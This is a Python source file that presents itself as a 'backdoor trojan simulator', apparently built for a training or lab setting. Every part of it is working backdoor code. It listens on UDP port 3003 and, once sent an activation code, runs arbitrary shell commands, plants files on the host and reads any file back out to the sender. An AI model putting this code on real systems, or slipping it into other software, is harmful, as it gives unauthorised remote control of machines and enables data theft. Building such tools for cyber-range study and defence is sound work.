#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        backdoorTrojan.py
#
# Purpose:     This module is used to simulate a trojan to open a backdoor to a
#              allow hacker to remote run command on a host without authorize. 
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1
# Created:     2023/09/21
# Copyright:   n.a
# License:     n.a
#-----------------------------------------------------------------------------

import os
import subprocess
import udpCom

UDP_PORT = 3003
ACT_CODE = 'YCACTTROJAN'
BUF_SZ = 60000

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

#-----------------------------------------------------------------------------
def base64Convert(data, b64Encode=True):
    """ Encode/decode a str to its base-64 string format.
    Args:
        messageStr (str): can be either base-64 message or plain text message.
        b64Encode (bool): whether the input is to be encoded to base-64, default True.
    Returns:
        string: base-64 message if b64Encode is True; else plain text message.
    """
    import base64
    if b64Encode:
        message_bytes = data.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        return base64_message
    else:
        base64_bytes = data.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('ascii')
        return message

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class backdoorTrojan(object):

#-----------------------------------------------------------------------------
    def __init__(self, port=UDP_PORT, actCode=ACT_CODE) -> None:
        self.active = False
        self.actCode = actCode
        self.server = udpCom.udpServer(None, UDP_PORT)
        self.server.setBufferSize(bufferSize=BUF_SZ)

#-----------------------------------------------------------------------------
    def run(self):
        print("Start the backdoor trojan simulator...")
        print("Start the UDP echo server licening port [%s]" % UDP_PORT)
        self.server.serverStart(handler=self.cmdHandler)
    
#-----------------------------------------------------------------------------
    def _parseIncomeMsg(self, msg):
        reqKey = reqType = reqData = None
        try:
            reqKey, reqType, reqData = msg.split(';', 2)
            return (reqKey.strip(), reqType.strip(), reqData)
        except Exception as e:
            print('The income message format is incorrect.')
            print(e)
            return (reqKey, reqType, reqData)

#-----------------------------------------------------------------------------
    def cmdHandler(self, msg):
        """ The test handler method passed into the UDP server to handle the 
            incoming messages.
        """
        print("Incomming command: %s" % str(msg))
        if isinstance(msg, bytes): msg = msg.decode('utf-8')
        if msg == self.actCode:
            self.active = True
            return 'ready'
        if not self.active: return None
        result = None
        reqKey, reqType, data = self._parseIncomeMsg(msg)
        if reqKey == 'CMD':
            result = self._runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = self._fileIO(reqType, data)
        else:
            result = 'Not support action.'
        return result

#-----------------------------------------------------------------------------
    def _runCmd(self, returnType, cmdStr):
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                return result if returnType == 'detail' else 'done'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return 'error'
        else:
            return 'error'

#-----------------------------------------------------------------------------
    def _fileIO(self, actionType, data):
        global dirpath
        if actionType == 'out':
            filePath = data
            print("Transfer file out from vicim: %s" %str(filePath))
            return self._copyFileOut(filePath)
        else:
            filename = actionType
            filedata = data
            filePath = os.path.join(dirpath, filename)
            print("Create the file at: %s " %str(filePath))
            return self._copyFileIn(filePath, filedata)

#-----------------------------------------------------------------------------
    def _copyFileIn(self, filePath, fileData):
        fileBytes = bytes.fromhex(fileData)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(fileBytes)
            return 'done'
        except Exception as err:
            print("File creation error: %s" %str(err))
            return 'error'

#-----------------------------------------------------------------------------
    def _copyFileOut(self, filePath):
        fileData = b'error'
        if os.path.exists(filePath):
            try:
                with open(filePath, 'rb') as fh:
                    fileData = fh.read()
                dataStr = fileData.hex()
                return dataStr
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
        print("File not found: %s" %str(filePath))
        return fileData.hex()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main(mode):
    trojan = backdoorTrojan()
    trojan.run()

if __name__ == "__main__":
    main(0)

